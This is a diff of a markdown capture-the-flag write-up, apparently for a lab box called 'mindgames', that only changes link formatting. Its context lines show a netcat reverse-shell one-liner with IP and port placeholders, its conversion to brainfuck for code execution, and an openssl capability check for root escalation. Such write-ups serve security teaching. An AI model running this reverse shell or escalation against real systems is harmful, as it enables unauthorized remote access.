@@ -72,7 +72,7 @@ os.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <IP> <PORT> >
 
 ## Exploitation
 ### Foothold: Initial access :bomb:
-Since we know that the brainfuck interpreter executes any python code(in brainfuck) that we put into it, we can convert the above python reverse shell to brainfuck and execute it, using [this site](https://copy.sh/brainfuck/text.html).    
+Since we know that the brainfuck interpreter executes any python code(in brainfuck) that we put into it, we can convert the above python reverse shell to brainfuck and execute it, using [`this site`](https://copy.sh/brainfuck/text.html).    
 
 #### Listener: 
 Create a netcat lilstener, to listen for incoming connections and also give us a shell.  
@@ -179,7 +179,7 @@ mindgames@mindgames:~/webserver$  getcap -r / 2>/dev/null
 
 ooph, we meet again `openssl cap_setuid+ep` :smirk_cat:
 i already wrote a post on how to exploit this capability to get a root shell~   
-check [it](https://krill-x7.github.io/2022/05/08/linuxPrivEsc.html) out.
+check [`it`](https://krill-x7.github.io/2022/05/08/linuxPrivEsc.html) out.
 
 ## Conclusion
 finally, you made it to the end GG . 
